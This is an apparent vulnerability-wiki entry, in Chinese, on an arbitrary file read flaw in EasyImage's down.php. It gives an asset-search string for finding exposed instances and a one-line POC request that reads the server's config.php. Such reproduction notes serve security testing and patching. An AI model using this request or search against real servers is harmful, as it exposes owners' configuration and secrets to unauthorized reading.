---
title: "EasyImage down.php 任意文件读取漏洞"
date: 2026-10-16 09:07:31
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "EasyImage"
tags:
  - "EasyImage"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

EasyImage down.php 文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器任意文件

## 漏洞影响

```
EasyImage
```

## 网络测绘

```
app="EasyImage-简单图床"
```

## 漏洞复现

主页面

![image-20230417094057151](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230417094057151.png)

验证POC

```
/application/down.php?dw=./config/config.php
```

![image-20230417094115549](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230417094115549.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/EasyImage-down.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
